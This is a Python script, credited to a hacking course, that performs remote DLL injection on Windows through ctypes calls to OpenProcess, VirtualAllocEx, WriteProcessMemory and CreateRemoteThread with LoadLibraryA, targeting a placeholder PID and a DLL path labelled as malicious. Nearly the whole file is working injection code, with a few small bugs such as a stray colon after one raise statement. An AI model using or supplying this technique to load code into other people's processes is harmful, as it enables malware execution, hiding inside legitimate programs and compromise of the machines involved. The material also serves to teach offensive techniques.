# Remote DLL Injection
# Credit goes to TCM Python 201 For Hackers Course
# Can only load once, so if doing multiple times we will need to use different PIDs

from ctypes import *
from ctypes import wintypes

kernel32 = windll.kernel32
LPCTSTR = c_char_p
SIZE_T = c_size_t

#Create our functions - based on the msdn pages for each windows function which show the arg types and return values
OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
OpenProcess.restype = wintypes.HANDLE

VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD)
VirtualAllocEx.restype = wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T))
WriteProcessMemory.restype = wintypes.BOOL

GetModuleHandle = kernel32.GetModuleHandle
GetModuleHandle.argtypes = (LPCTSTR, )
GetModuleHandle.restype = wintypes.HANDLE

GetProcAddress = kernel32.GetProcAddress
GetProcAddress.argtypes = (wintypes.HMODULE, LPCTSTR)
GetProcAddress.restype = wintypes.LPVOID

class _SECURITY_ATTRIBUTES(Structure):
    _fields_ = [('nLength', wintypes.DWORD),
                ('lpSecurityDescriptor', wintypes.LPVOID),
                ('bInheritHandle', wintypes.BOOL)]

SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID

CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = (wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, wintypes.LPDWORD)
CreateRemoteThread.restype = wintypes.HANDLE

#Constants for working with memory, can be found at https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex and 
# https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
EXECUTE_IMMEDIATELY = 0x0
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)

dll = b"C:\Path\To\Malicious\DLL"
pid = 9999 # process ID of process you want to inject into

#open a handle to the target process, Flase is to not inherit Handle (parameters found in msdn documentation) 
handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)

if not handle:
    raise WinError()

print("Hooks in => {0:X}".format(handle))

#Use VirtualAllocEx to create memory in the process

remote_memory = VirtualAllocEx(handle, False, len(dll) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)

if not remote_memory:
    raise WinError()

print ("Memory allocated => {0:X}", hex(remote_memory))

#write file location into process memory
write = WriteProcessMemory(handle, remote_memory, dll, len(dll) + 1, None)

if not write:
    raise WinError():

print("Bytes written => {}".format(dll))

# start a new thread to load the DLL with load library A, we can find this with GetProcAddress and GetModuleHandle

load_lib = GetProcAddress(GetModuleHandle(b"kernel32.dll") , b"LoadLibraryA")

print("LoadLibrary address => ", hex(load_lib))

#create the remote thread
rthread = CreateRemoteThread(handle, None, 0, load_lib, remote_memory, EXECUTE_IMMEDIATELY, None)

# Now you should be able to see that the DLL was loaded either using powershell gps.modules or process hacker
